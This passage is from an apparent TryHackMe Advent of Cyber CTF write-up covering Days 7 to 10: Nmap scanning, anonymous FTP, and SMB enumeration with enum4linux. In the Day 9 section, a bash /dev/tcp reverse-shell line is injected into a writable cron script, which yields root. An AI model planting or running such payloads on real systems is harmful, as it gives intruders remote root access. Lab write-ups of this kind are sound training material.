class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">Archive:  christmas.zip</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  inflating: AoC-2020.png            </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  inflating: christmas-tree.jpg      </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  inflating: elf_mcskidy_wishlist.txt  </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  inflating: Operation Artic Storm.pdf  </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  inflating: selfie.jpg              </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  inflating: tryhackme_logo_full.svg  </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>We can read Elf McSkidy&#x27;s wishlist using the following command:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">cat day07-the-grinch-really-did-steal-christmas/christmas/elf_mcskidy_wishlist.txt</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>And we see the following:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">Wish list for Elf McSkidy</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-------------------------</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Budget: £100</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">x3 Hak 5 Pineapples</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">x1 Rubber ducky (to replace Elf McEager)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="day-8-whats-under-the-christmas-tree">Day 8: What&#x27;s Under the Christmas Tree?<a href="#day-8-whats-under-the-christmas-tree" class="hash-link" aria-label="Direct link to Day 8: What&#x27;s Under the Christmas Tree?" title="Direct link to Day 8: What&#x27;s Under the Christmas Tree?">​</a></h2><p><em>Category: Networking</em><br>
<em>Tags: Nmap</em>  </p><blockquote><p>Practice the most fundamental stage of penetration testing: information gathering, using industry standard tools/techniques.</p></blockquote><p>IP: <code>10.10.2.45</code></p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="running-the-nmap-scan">Running the Nmap scan<a href="#running-the-nmap-scan" class="hash-link" aria-label="Direct link to Running the Nmap scan" title="Direct link to Running the Nmap scan">​</a></h3><p>We run nmap with the following command:</p><div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">nmap -sC -sV -A -O -oN day08-whats-under-the-christmas-tree/nmap.log 10.10.2.45</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>And we get the following results:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-08 13:15 EST</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Nmap scan report for tbfc.blog (10.10.2.45)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Host is up (0.11s latency).</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Not shown: 997 closed ports</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">PORT     STATE SERVICE       VERSION</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">80/tcp   open  http          Apache httpd 2.4.29 ((Ubuntu))</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_http-generator: Hugo 0.78.2</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_http-title: TBFC&amp;#39;s Internal Blog</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">2222/tcp open  ssh           OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">| ssh-hostkey: </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   2048 cf:c9:99:d0:5c:09:27:cd:a1:a8:1b:c2:b1:d5:ef:a6 (RSA)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|   256 4c:d4:f9:20:6b:ce:fc:62:99:54:7d:c2:b4:b2:f2:b2 (ECDSA)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|_  256 d0:e6:72:18:b5:20:89:75:d5:69:74:ac:cc:b8:3b:9b (ED25519)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">3389/tcp open  ms-wbt-server xrdp</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Nmap done: 1 IP address (1 host up) scanned in 86.52 seconds</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="what-ports-are-open">What ports are open?<a href="#what-ports-are-open" class="hash-link" aria-label="Direct link to What ports are open?" title="Direct link to What ports are open?">​</a></h3><ul><li>Port 80 for HTTP</li><li>Port 2222 for SSH</li><li>Port 3389 for ms-wbt-server</li></ul><h3 class="anchor anchorWithStickyNavbar_LWe7" id="what-linux-distribution-is-the-box">What Linux Distribution is the box?<a href="#what-linux-distribution-is-the-box" class="hash-link" aria-label="Direct link to What Linux Distribution is the box?" title="Direct link to What Linux Distribution is the box?">​</a></h3><p><code>Ubuntu</code></p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="what-is-the-http-title-for-the-webserver">What is the &quot;HTTP-TITLE&quot; for the webserver<a href="#what-is-the-http-title-for-the-webserver" class="hash-link" aria-label="Direct link to What is the &quot;HTTP-TITLE&quot; for the webserver" title="Direct link to What is the &quot;HTTP-TITLE&quot; for the webserver">​</a></h3><p><code>http-title: TBFC&amp;#39;s Internal Blog</code></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="day-9-anyone-can-be-santa">Day 9: Anyone can be Santa!<a href="#day-9-anyone-can-be-santa" class="hash-link" aria-label="Direct link to Day 9: Anyone can be Santa!" title="Direct link to Day 9: Anyone can be Santa!">​</a></h2><p><em>Category: Networking</em><br>
<em>Tags: FTP</em></p><blockquote><p>Discover a common misconfiguration on file transfer servers, and understand how it may be abused.</p></blockquote><p>IP: <code>10.10.112.57</code></p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="connecting-to-the-ftp-server-and-basic-enumeration">Connecting to the FTP server and basic enumeration<a href="#connecting-to-the-ftp-server-and-basic-enumeration" class="hash-link" aria-label="Direct link to Connecting to the FTP server and basic enumeration" title="Direct link to Connecting to the FTP server and basic enumeration">​</a></h3><p>In a Linux Terminal, I used the <code>ftp</code> command and connected to the FTP server as <code>anonymous</code>.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">ftp 10.10.112.57</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Now that we are in, let&#x27;s see what files we can find...</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">ftp&gt; ls</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">200 PORT command successful. Consider using PASV.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">150 Here comes the directory listing.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">drwxr-xr-x    2 0        0            4096 Nov 16 15:04 backups</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">drwxr-xr-x    2 0        0            4096 Nov 16 15:05 elf_workshops</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">drwxr-xr-x    2 0        0            4096 Nov 16 15:04 human_resources</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">drwxrwxrwx    2 65534    65534        4096 Nov 16 19:35 public</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><code>backups</code>, <code>elf_workshops</code> and <code>human_resources</code> appear to be empty. However, let&#x27;s investigate <code>public</code> further.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">ftp&gt; cd public</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">250 Directory successfully changed.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">ftp&gt; ls</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">200 PORT command successful. Consider using PASV.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">150 Here comes the directory listing.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rwxr-xr-x    1 111      113           341 Nov 16 19:34 backup.sh</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rw-rw-rw-    1 111      113            24 Nov 16 19:35 shoppinglist.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">226 Directory send OK.</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Interesting, let&#x27;s download these two files to examine them further...</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">ftp&gt; get backup.sh</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">local: backup.sh remote: backup.sh</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">200 PORT command successful. Consider using PASV.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">150 Opening BINARY mode data connection for backup.sh (341 bytes).</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">226 Transfer complete.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">341 bytes received in 0.00 secs (481.9216 kB/s)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">ftp&gt; get shoppinglist.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">local: shoppinglist.txt remote: shoppinglist.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">200 PORT command successful. Consider using PASV.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">150 Opening BINARY mode data connection for shoppinglist.txt (24 bytes).</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">226 Transfer complete.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">24 bytes received in 0.00 secs (107.0206 kB/s)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Success!</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="shoppinglisttxt">shoppinglist.txt<a href="#shoppinglisttxt" class="hash-link" aria-label="Direct link to shoppinglist.txt" title="Direct link to shoppinglist.txt">​</a></h3><p>It turns out, <code>shoppinglist.txt</code> isn&#x27;t all that interesting... All we learn is that Santa has <code>The Polar Express Movie</code> on his shopping list.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="backupsh">backup.sh<a href="#backupsh" class="hash-link" aria-label="Direct link to backup.sh" title="Direct link to backup.sh">​</a></h3><p><code>backup.sh</code>? More like <code>backdoor.sh</code>...  </p><p>This bash shell script seams to be a cron job (something that runs automatically at a set time or time interval on a Linux system). Let&#x27;s modify it to set up a reverse shell! First, I set up a netcat listener of port 4444 by running <code>nc -lvnp 4444</code>. Then, I added the following line to <code>backup.sh</code> before uploading it to the FTP server. (note: <code>10.6.23.34</code> is the IP of my attack machine)</p><div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain"># Added this line</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">bash -i &gt;&amp; /dev/tcp/10.6.23.34/4444 0&gt;&amp;1</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="becoming-root-and-getting-the-flag">Becoming root and getting the flag!<a href="#becoming-root-and-getting-the-flag" class="hash-link" aria-label="Direct link to Becoming root and getting the flag!" title="Direct link to Becoming root and getting the flag!">​</a></h3><p>First, I uploaded the <code>backup.sh</code> file with the payload from the previous section using FTP:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">ftp&gt; put backup.sh </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">local: backup.sh remote: backup.sh</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">200 PORT command successful. Consider using PASV.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">150 Ok to send data.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">226 Transfer complete.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">381 bytes sent in 0.00 secs (5.7675 MB/s)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Sure enough, I got the reverse shell within seconds:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">Listening on 0.0.0.0 4444</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Connection received on 10.10.112.57 60270</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">bash: cannot set terminal process group (1525): Inappropriate ioctl for device</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">bash: no job control in this shell</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">root@tbfc-ftp-01:~# whoami</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">whoami</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">root</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Now, that we are root, we can read <code>/root/flag.txt</code> and get the flag!</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">root@tbfc-ftp-01:~# cat /root/flag.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">cat /root/flag.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">THM{even_you_can_be_santa}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Flag: <code>THM{even_you_can_be_santa}</code></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="day-10-dont-be-elfish">Day 10: Don&#x27;t be Elfish!<a href="#day-10-dont-be-elfish" class="hash-link" aria-label="Direct link to Day 10: Don&#x27;t be Elfish!" title="Direct link to Day 10: Don&#x27;t be Elfish!">​</a></h2><p><em>Category: Networking</em><br>
<em>Tags: SMB</em></p><blockquote><p>Get hands-on with Samba, a protocol used for sharing resources like files and printers with other devices.</p></blockquote><p>IP: <code>10.10.111.123</code></p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="getting-enum4linux">Getting Enum4Linux<a href="#getting-enum4linux" class="hash-link" aria-label="Direct link to Getting Enum4Linux" title="Direct link to Getting Enum4Linux">​</a></h3><p><a href="https://github.com/CiscoCXSecurity/enum4linux/blob/master/enum4linux.pl" target="_blank" rel="noopener noreferrer">Click here to view <code>enum4linux.pl</code> on GitHub</a>  </p><p>(It can also be found on the THM Attackbox here: <code>/root/Desktop/Tools/Miscellaneous/enum4linux.pl</code>)</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="basic-enumeration-4">Basic Enumeration<a href="#basic-enumeration-4" class="hash-link" aria-label="Direct link to Basic Enumeration" title="Direct link to Basic Enumeration">​</a></h3><p>We can begin by looking for users and shares on the box using this command:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">./enum4linux.pl -U -S 10.10.111.123</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>And we find the following 3 users:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain"> ============================== </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">|    Users on 10.10.111.123    |</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> ============================== </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: elfmcskidy       Name:   Desc: </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">index: 0x2 RID: 0x3ea acb: 0x00000010 Account: elfmceager       Name: elfmceager        Desc: </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">index: 0x3 RID: 0x3e9 acb: 0x00000010 Account: elfmcelferson    Name:   Desc: </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user:[elfmcskidy] rid:[0x3e8]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user:[elfmceager] rid:[0x3ea]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user:[elfmcelferson] rid:[0x3e9]</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>We also find the following 4 shares:</p><div class="codeBlockContainer_Ckt0 theme-code-block" 